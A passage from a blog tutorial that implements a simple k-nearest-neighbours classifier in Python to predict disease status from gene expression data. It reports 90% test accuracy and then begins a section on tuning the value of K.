<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="step-5-build-the-complete-knn-classifier">Step 5: Build the Complete KNN Classifier<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#step-5-build-the-complete-knn-classifier" class="hash-link" aria-label="Direct link to Step 5: Build the Complete KNN Classifier" title="Direct link to Step 5: Build the Complete KNN Classifier" translate="no">​</a></h3>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">class</span><span class="token plain"> </span><span class="token class-name" style="color:hsl(35, 99%, 36%)">KNNClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    A simple KNN classifier for bioinformatics data classification.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    Parameters:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    - k: number of nearest neighbors to consider</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    - distance_metric: 'euclidean' (default) or 'manhattan'</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">    """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">__init__</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> distance_metric</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">'euclidean'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">k </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> k</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">distance_metric </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> distance_metric</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">X_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">y_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">None</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">distance</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sample1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> sample2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Calculate distance between two samples."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">distance_metric </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'euclidean'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Euclidean: sqrt(sum of squared differences)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">sqrt</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain"> sample2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">**</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">elif</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">distance_metric </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">'manhattan'</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Manhattan: sum of absolute differences</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Like walking on a city grid instead of straight line</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token builtin" style="color:hsl(119, 34%, 47%)">abs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">-</span><span class="token plain"> sample2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">else</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">raise</span><span class="token plain"> ValueError</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Unknown distance metric"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">        Store training data.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">        KNN is a "lazy learner" - it doesn't learn patterns,</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">        it just memorizes the training data.</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">        """</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">X_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> X_train</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">y_train </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> y_train</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"✓ Stored </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">X_train</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)"> training samples"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Predict class for all test samples."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> sample </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Calculate distances to all training samples</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            distances </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">distance</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> train_sample</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">                </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> train_sample </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">X_train</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Find K nearest neighbors</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            k_indices </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">argsort</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">distances</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">k</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            neighbor_labels </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain">k_indices</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Vote for the most common class</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            votes </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> Counter</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">neighbor_labels</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            prediction </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> votes</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">most_common</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token number" style="color:hsl(35, 99%, 36%)">1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">            predictions</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">append</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">prediction</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">array</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">predictions</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">score</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Calculate accuracy on test set."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> self</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        accuracy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> np</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">mean</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">predictions </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> accuracy</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Create and train the classifier</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">knn </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> KNNClassifier</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">k</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token number" style="color:hsl(35, 99%, 36%)">3</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">fit</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_train</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Make predictions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">y_pred </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">predict</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">accuracy </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> knn</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">score</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">X_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> y_test</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"\nKNN Classifier Performance:"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"K = 3"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Accuracy on test set: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">accuracy</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation format-spec">.2%</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">print</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Correct predictions: </span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">y_pred </span><span class="token string-interpolation interpolation operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token string-interpolation interpolation"> y_test</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">sum</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">/</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation builtin" style="color:hsl(119, 34%, 47%)">len</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation interpolation">y_test</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Output:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">✓ Stored 80 training samples</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">KNN Classifier Performance:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">K = 3</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Accuracy on test set: 90.00%</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Correct predictions: 18/20</span><br></span></code></pre></div></div>
<p>Excellent! Our KNN classifier achieves 90% accuracy on the test set—correctly predicting the disease status of 18 out of 20 patients based on gene expression patterns.</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-2-tuning-parameters">Part 2: Tuning Parameters<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#part-2-tuning-parameters" class="hash-link" aria-label="Direct link to Part 2: Tuning Parameters" title="Direct link to Part 2: Tuning Parameters" translate="no">​</a></h2>
<p>The power of KNN comes from parameter tuning. Let's experiment!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="experiment-1-effect-of-k-value">Experiment 1: Effect of K Value<a href="https://riverxdata.github.io/river-docs/blog/machine-learning-bioinformatics-part1-knn#experiment-1-effect-of-k-value" class="hash-link" aria-label="Direct link to Experiment 1: Effect of K Value" title="Direct link to Experiment 1: Effect of K Value" translate="no">​</a></h3>
<p>K controls how many neighbors to consider. What's the best value?</p>
